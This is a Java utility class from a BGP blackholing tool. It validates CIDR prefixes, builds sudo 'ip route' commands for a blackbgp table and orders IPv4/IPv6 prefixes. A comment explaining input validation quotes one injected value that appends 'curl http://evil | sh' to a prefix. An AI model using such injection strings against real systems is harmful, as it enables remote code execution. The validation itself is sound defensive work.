/*
 * Copyright 2026 olden.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package net.ukrcom.asblockwar.actions;

import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Comparator;
import java.util.regex.Pattern;
import lombok.extern.slf4j.Slf4j;

/**
 * Мережеві утиліти: генерація команд blackbgp, валідація та компаратори CIDR-адрес.
 */
@Slf4j
public class NetworkUtils {

    /** Строгий dotted-quad. Відкидає скорочені форми («10.1») і цілі («1234»), які приймає {@link InetAddress}. */
    private static final Pattern IPV4_STRICT = Pattern.compile(
            "(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}");

    /** Дозволені символи IPv6-літерала — щоб {@link InetAddress#getByName} не пішов у DNS. */
    private static final Pattern IPV6_LITERAL = Pattern.compile("[0-9A-Fa-f:.]+");

    private NetworkUtils() {
    }

    /**
     * Перевіряє, що рядок є коректним CIDR-префіксом і безпечний для підстановки
     * у команду роутера.
     * <p>
     * Це <b>межа довіри</b>, а не косметика: результат потрапляє у {@code war.blackbgp.txt},
     * який на blackbgp-сервері виконується як shell-скрипт ({@code source}). Значення
     * приходять із двох недовірених джерел — полів {@code route:}/{@code route6:} дампу
     * RPSL (їх пишуть оператори ворожих AS) і з {@code ForceNETBlock} у конфізі.
     * Рядок на кшталт {@code "192.0.2.0/24 ; curl http://evil | sh #"} інакше став би
     * виконуваною командою поруч із {@code sudo}.
     * <p>
     * Після цієї перевірки префікс складається виключно з {@code [0-9A-Fa-f:.]} та цифр
     * маски — жодного пробілу чи метасимволу оболонки.
     *
     * @param prefix CIDR-префікс
     * @param source джерело значення — потрапляє в лог, щоб було видно, звідки сміття
     * @return {@code true}, якщо префікс коректний
     */
    public static boolean isValidPrefix(String prefix, String source) {
        if (prefix == null) {
            return false;
        }
        int slash = prefix.indexOf('/');
        if (slash < 0) {
            log.warn("{}: пропущено «{}» — немає довжини маски", source, prefix);
            return false;
        }
        String addr = prefix.substring(0, slash);
        boolean v6 = addr.contains(":");

        int len;
        try {
            len = Integer.parseInt(prefix.substring(slash + 1));
        } catch (NumberFormatException e) {
            log.warn("{}: пропущено «{}» — некоректна довжина маски", source, prefix);
            return false;
        }
        int max = v6 ? 128 : 32;
        if (len < 0 || len > max) {
            log.warn("{}: пропущено «{}» — довжина маски поза межами /0../{}", source, prefix, max);
            return false;
        }

        if (!v6) {
            if (IPV4_STRICT.matcher(addr).matches()) {
                return true;
            }
            log.warn("{}: пропущено «{}» — некоректна IPv4-адреса", source, prefix);
            return false;
        }

        // IPv6 має забагато легітимних скорочень для regex — перевіряємо розбором.
        // Спершу відсіюємо не-літерали, інакше getByName() зробив би DNS-запит.
        if (!IPV6_LITERAL.matcher(addr).matches()) {
            log.warn("{}: пропущено «{}» — некоректна IPv6-адреса", source, prefix);
            return false;
        }
        try {
            if (InetAddress.getByName(addr) instanceof Inet6Address) {
                return true;
            }
        } catch (UnknownHostException e) {
            // нижче — спільний лог
        }
        log.warn("{}: пропущено «{}» — некоректна IPv6-адреса", source, prefix);
        return false;
    }

    /**
     * Формує рядок команди для управління маршрутом у таблиці blackbgp.
     * <p>
     * Для IPv6-prefix додає прапор {@code -6}.
     * Синтаксис: {@code sudo ip [-6] r VERB bl PREFIX t blackbgp}.
     *
     * @param verb дієслово команди: {@code "r"} (replace/add) або {@code "d"} (delete)
     * @param prefix мережевий prefix у нотації CIDR
     * @return готовий рядок команди
     */
    public static String blackbgpCmd(String verb, String prefix) {
        boolean isIpv6 = prefix.contains(":");
        return "sudo ip " + (isIpv6 ? "-6 " : "") + "r " + verb + " bl " + prefix + " t blackbgp";
    }


    /**
     * Розбирає IPv6-літерал у пару {@code {старші 64, молодші 64}} біти.
     * <p>
     * Власний парсер, а не {@link InetAddress}: метод викликається з компаратора,
     * тобто O(n·log n) разів — на 60 000 префіксів це під мільйон розборів, і
     * {@code getByName()} там коштував би секунди.
     *
     * @param addr IPv6-адреса без маски
     * @return пара {@code long}, або {@code null} якщо розібрати не вдалося
     *         (вбудований IPv4, зона, сміття) — тоді викликач падає назад на порівняння рядків
     */
    private static long[] ipv6ToLongs(String addr) {
        if (addr.indexOf('.') >= 0 || addr.indexOf('%') >= 0) {
            return null;
        }
        String[] halves = addr.split("::", -1);
        if (halves.length > 2) {
            return null;
        }
        String[] left = halves[0].isEmpty() ? new String[0] : halves[0].split(":");
        String[] right = (halves.length == 2 && !halves[1].isEmpty()) ? halves[1].split(":") : new String[0];
        if (left.length + right.length > 8 || (halves.length == 1 && left.length != 8)) {
            return null;
        }
        int[] g = new int[8];
        try {
            for (int i = 0; i < left.length; i++) {
                g[i] = Integer.parseInt(left[i], 16);
            }
            for (int i = 0; i < right.length; i++) {
                g[8 - right.length + i] = Integer.parseInt(right[i], 16);
            }
        } catch (NumberFormatException e) {
            return null;
        }
        long hi = 0;
        long lo = 0;
        for (int i = 0; i < 4; i++) {
            hi = (hi << 16) | g[i];
        }
        for (int i = 4; i < 8; i++) {
            lo = (lo << 16) | g[i];
        }
        return new long[]{hi, lo};
    }

    /**
     * Порівнює дві IPv6-адреси числово.
     * <p>
     * Раніше тут було {@code String.compareTo}, через що {@code 2a2::} (0x02a2)
     * опинялася <b>після</b> {@code 2a14::} — лексикографічно {@code '2' > '0'},
     * хоча числово навпаки. Впливало на порядок у {@code war.blackbgp.txt},
     * {@code networks.list} та email-звіті.
     *
     * @param a перша адреса без маски
     * @param b друга адреса без маски
     * @return від'ємне/нуль/додатне за звичайним контрактом компаратора
     */
    private static int compareIpv6(String a, String b) {
        long[] x = ipv6ToLongs(a);
        long[] y = ipv6ToLongs(b);
        if (x == null || y == null) {
            return a.compareTo(b);
        }
        int hi = Long.compareUnsigned(x[0], y[0]);
        return hi != 0 ? hi : Long.compareUnsigned(x[1], y[1]);
    }

    // CIDR comparator: IPv4 before IPv6; within each family — prefix length desc, then address asc
    public static final Comparator<String> CIDR_ORDER = (a, b) -> {
        boolean aV6 = a.contains(":");
        boolean bV6 = b.contains(":");
        if (aV6 != bV6) {
            return aV6 ? 1 : -1;
        }
        int la = cidrLen(a), lb = cidrLen(b);
        if (la != lb) {
            return lb - la; // descending: more specific first
        }
        if (!aV6) {
            return Long.compare(ipv4ToLong(cidrAddr(a)), ipv4ToLong(cidrAddr(b)));
        }
        return compareIpv6(cidrAddr(a), cidrAddr(b));
    };

    /**
     * Повертає довжину маски з CIDR-нотації.
     *
     * @param cidr рядок у нотації CIDR, наприклад {@code "192.168.0.0/24"}
     * @return числова довжина маски або {@code 0}, якщо рядок не містить {@code /}
     */
    public static int cidrLen(String cidr) {
        int i = cidr.lastIndexOf('/');
        try {
            return i >= 0 ? Integer.parseInt(cidr.substring(i + 1)) : 0;
        } catch (NumberFormatException e) {
            return 0;
        }
    }

    /**
     * Повертає адресну частину з CIDR-нотації (без маски).
     *
     * @param cidr рядок у нотації CIDR, наприклад {@code "192.168.0.0/24"}
     * @return адреса, наприклад {@code "192.168.0.0"}
     */
    public static String cidrAddr(String cidr) {
        int i = cidr.lastIndexOf('/');
        return i >= 0 ? cidr.substring(0, i) : cidr;
    }

    /**
     * Перетворює IPv4-адресу у 32-розрядне ціле для числового порівняння.
     *
     * @param addr IPv4-адреса у крапково-десятковому форматі
     * @return числове представлення адреси або {@code 0} при помилці парсингу
     */
    public static long ipv4ToLong(String addr) {
        String[] p = addr.split("\\.", -1);
        if (p.length != 4) {
            return 0;
        }
        try {
            return (Long.parseLong(p[0]) << 24) | (Long.parseLong(p[1]) << 16)
                    | (Long.parseLong(p[2]) << 8) | Long.parseLong(p[3]);
        } catch (NumberFormatException e) {
            return 0;
        }
    }

    // networks.list order: IPv4 before IPv6; within each family — address asc, then mask asc (1..32)
    public static final Comparator<String> NETWORK_ADDR_ORDER = (a, b) -> {
        boolean aV6 = a.contains(":");
        boolean bV6 = b.contains(":");
        if (aV6 != bV6) {
            return aV6 ? 1 : -1;
        }
        int addrCmp = aV6
                      ? compareIpv6(cidrAddr(a), cidrAddr(b))
                      : Long.compare(ipv4ToLong(cidrAddr(a)), ipv4ToLong(cidrAddr(b)));
        if (addrCmp != 0) {
            return addrCmp;
        }
        return Integer.compare(cidrLen(a), cidrLen(b));
    };
}
